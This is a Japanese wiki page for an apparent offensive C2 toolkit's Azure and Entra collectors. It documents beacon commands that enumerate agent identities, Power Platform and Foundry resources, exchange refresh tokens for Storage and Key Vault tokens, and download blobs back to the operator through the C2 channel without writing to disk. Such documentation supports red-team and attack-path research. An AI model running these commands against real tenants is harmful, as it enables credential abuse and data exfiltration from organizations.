# 追加コレクター

[English](../Additional-Collectors.md) | [日本語](Additional-Collectors.md)
[Wiki の目次](Home.md) | [実行手順](../../README.ja.md)

## Entra Agent の OpenGraph 収集

`bark_get_entra_agents_opengraph` は Microsoft Graph Agent ID の制御プレーンから、blueprint、blueprint principal、agent identity、agent user、所有者、blueprint sponsor、既存 SP との関連を取得します。資格情報モードが観測できない場合、エージェントが maker として動作すると推定するエッジは作成しません。

```text
beacon> bark_get_entra_agents_opengraph <graph_token>
```

エンドポイントに応じて `AgentIdentity.Read.All`、`AgentIdentityBlueprint.Read.All`、`AgentIdentityBlueprintPrincipal.Read.All`、`User.ReadBasic.All` などが必要です。権限／ディレクトリロールの追加情報には `Directory.Read.All` なども必要になる場合があります。

blueprint sponsor は `Application.Read.All` で取得します。agent identity の sponsor は現在の API が `AgentIdentity.ReadWrite.All` を要求するため取得しません。既定の download mode ON では JSON を C2 経由で返します。

## Foundry と Power Platform

Foundry は ARM トークンを使い、制御プレーンのアカウント、プロジェクト、アカウントスコープのロール割り当てを取得します。

```text
beacon> bark_get_azurerm_foundry_opengraph <arm_token>
```

Power Platform は別 resource の `api.powerplatform.com` 用トークンで、環境、接続メタデータ、Copilot Studio agent、agent / Cloud flow、connector operation メタデータを取得します。

```text
beacon> bark_get_powerplatform_opengraph <powerplatform_token>
```

接続シークレット、flow 定義 / clientdata、実行履歴、個別 run-only principal、モデル内容、デプロイ、Foundry データプレーンは収集しません。所有者 ID は Microsoft が Entra object ID と定義したものだけを対応付けます。Cloud Flows fallback の所有者 ID は Dataverse 識別子としてメタデータに保持します。

`AZAgent_CanInvoke` は認証不要・リンクを知る全員が利用できるケースだけに限定します。`AZAgent_ActsAs` は maker 提供の接続と operation creator が明示された場合に作成します。viewer / editor の集計人数を個人のエッジには変換しません。

## データプレーンの確認

Storage / Key Vault には各データエンドポイント用トークンを使用します。コンテナーやシークレットのメタデータ一覧への成功応答は、そのリクエストへのアクセスを示します。403 は拒否です。制御プレーンで見えるリソースへのデータアクセスが許可されるとは限りません。

ファイルを使う probe では、先に ARM / Entra BH 収集で対象ディレクトリに JSON を保存します。既定はディスクレスのため、この場合は `bark_download_mode off` を使用します。probe は最新の一致ファイルを読み取り、出力ファイルは作成しません。

```text
beacon> bark_download_mode off
beacon> bark_get_azurerm_info_bh <arm_token>
beacon> bark_get_tokens_with_rt https://storage.azure.com "" <refreshToken> <tenantId>
beacon> bark_probe_storage_data_plane <storage_token>
beacon> bark_list_storage_containers <storage_token> <account_name>
beacon> bark_list_storage_blobs <storage_token> <account_name> <container_name>
beacon> bark_download_storage_blob <storage_token> <account_name> <container_name> <blob_name> [download_name]
beacon> bark_get_tokens_with_rt https://vault.azure.net "" <refreshToken> <tenantId>
beacon> bark_probe_key_vault_data_plane <vault_token>
```

Storage probe は `AZStorageAccount_*.json`、`AZApp_*.json`、`AZServicePrincipal_*.json` から `*.blob.core.windows.net` を探します。Key Vault probe は `AZKeyVault_*.json` とアプリ／SP ファイルから vault ホストを探します。

アカウント名などが既知なら `bark_list_storage_containers` / `bark_list_storage_blobs` を直接使用できます。最大5,000件／ページで continuation marker を追跡します。`https://storage.azure.com` のトークンと適切な Storage Blob Data ロールが必要です。

`bark_download_storage_blob` は 256 KiB ごとに `BeaconDownload()` で送り、対象ディスクに保存しません。`download_name` を省略するとアカウントと blob 名から安全な prefix を生成します。オペレーター側で `.partNNNNN` を数値順に再結合します。

同じファイル探索を使い、トークン交換と両 probe をまとめる例です。

```text
beacon> bark_probe_data_plane_rt <tenantId> <refreshToken>
```

ファイルに依存しない自己完結型は次のとおりです。

```text
beacon> bark_probe_data_plane <refreshToken> <tenantId>
```

ARM / MS Graph トークンを取得し、サブスクリプションとアプリ／SP の URL から対象を探索した後、Storage / Key Vault トークンで確認します。探索状態はメモリ内に保持し、対象ファイルは読み書きしません。両 RT probe は既定6クライアントを試行します。自己完結型では MS Graph 認証・アプリ／SP 取得に失敗すると legacy AAD Graph も試し、ARM 探索は独立して継続します。

`bark_get_all_info_bh_rt` の最終段階も自己完結型を使用するため、ディスクレス収集に対応しています。
